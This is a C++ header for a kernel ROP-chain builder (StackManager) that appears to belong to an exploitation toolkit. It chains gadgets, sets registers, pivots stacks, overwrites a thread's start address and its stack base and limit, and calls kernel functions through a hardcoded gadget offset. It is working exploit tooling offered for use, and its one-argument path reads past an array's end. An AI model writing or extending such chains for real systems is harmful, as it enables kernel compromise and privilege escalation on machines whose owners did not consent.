#pragma once
#include <memory>
#include <vector>
#include <string_view>
#include <include/driver/kernel_addresses.hpp>

class StackManager
{
protected:
    std::unique_ptr<std::vector<std::uint64_t>> Stack;
private:
	std::uintptr_t KernelModuleBase = NULL;
	std::uintptr_t StackAllocAddress = NULL;
	std::size_t StackSizeLimit = NULL;
    void ModifyThreadField(const std::uint64_t FieldOffset, const std::uint64_t NewValue);

public:
	StackManager(const std::uintptr_t _KernelModuleBase, const std::uintptr_t _StackAllocAddress, const size_t _StackSizeLimit = 0x2000)
		: KernelModuleBase(_KernelModuleBase), StackAllocAddress(_StackAllocAddress), StackSizeLimit(_StackSizeLimit)
	{
        Stack = std::make_unique<std::vector<std::uint64_t>>();
	}

    std::uint64_t* GetStackBuffer();
    std::size_t GetStackSize();
    void AddGadget(const std::uint64_t GadgetOffset, const std::string_view& GadgetLogName);
    void AddValue(const std::uint64_t Value, const std::string_view& ValueLogName);
    void AddPadding(const std::size_t PaddingSize = 8);
    void ReadIntoRcx(const std::uint64_t ReadAddress);
    void ReadIntoR8(const std::uint64_t ReadAddress);
    void ReadRaxIntoRax();
    void PivotToR11();
    void MovRaxIntoR9();
    void MovRaxIntoR8();
    void SetR8(const std::uint64_t NewR8Value);
    void SetR9(const std::uint64_t NewR9Value);
    void SetRdx(const std::uint64_t NewRdxValue);
    void SetRcxRdx(const std::uint64_t NewRcxValue, const std::uint64_t NewRdxValue);
    void SetRaxRcxRdx(const std::uint64_t NewRaxValue, const std::uint64_t NewRcxValue, const std::uint64_t NewRdxValue);
    void ModifyThreadStartAddress(const std::uint64_t NewStartAddress);
    void ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBase, const std::uint64_t NewStackLimit);
    void PivotToNewStack(StackManager& StackToPivot);
    void LoopBack();
    void AlignStack();

    template<typename... Args>
    void AddFunctionCall(const std::string_view& FunctionName, Args&&... args)
    {
        constexpr std::size_t ArgCount = sizeof...(Args);
        const std::uint64_t FunctionAddress = Driver::GetKernelFunctionOffset(FunctionName);

        // Setup ropchain for arguments only if there are any
        if constexpr (ArgCount > 0)
        {
            std::uint64_t ConvertedArgs[] = { static_cast<std::uint64_t>(args)... };

            // Setting up the fourth gadget here, this gadget requires us to set up both r8 and rcx
            // correctly, so we will be performing this before setting the rest of the arguments.
            if (ArgCount >= 4)
                this->SetR9(ConvertedArgs[3]);

            if (ArgCount >= 3)
                this->SetR8(ConvertedArgs[2]);

            // If we have any args, we place a value into rcx (arg1) and rdx (arg2) using a single gadget.
            this->SetRcxRdx(ConvertedArgs[0], ConvertedArgs[1]);
        }

        // Align stack to 16 bytes prior to performing a function call.
        this->AlignStack();

        this->AddGadget(FunctionAddress, "Function to call address");

        this->AddGadget(0xbac76a, "add rsp, 0x20; ret;");
        this->AddValue(0, "Shadow space 1");
        this->AddValue(0, "Shadow space 2");
        this->AddValue(0, "Shadow space 3");
        this->AddValue(0, "Shadow space 4");
    }
};
